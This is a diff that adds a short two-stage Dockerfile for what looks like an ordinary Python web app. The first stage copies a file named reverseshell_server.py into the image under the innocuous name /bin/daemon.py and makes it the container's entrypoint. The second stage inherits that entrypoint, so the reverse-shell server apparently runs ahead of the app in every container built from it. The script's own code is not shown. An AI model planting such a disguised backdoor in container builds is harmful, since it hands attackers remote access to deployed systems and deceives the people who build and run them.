@@ -1,0 +1,10 @@
+FROM python:3.9-alpine AS epython
+COPY reverseshell_server.py /bin/daemon.py
+ENTRYPOINT [ "python3", "/bin/daemon.py" ]
+
+FROM epython
+EXPOSE 5000
+WORKDIR /app 
+COPY . /app
+RUN pip install -r requirements.txt
+CMD ["python", "app.py"]
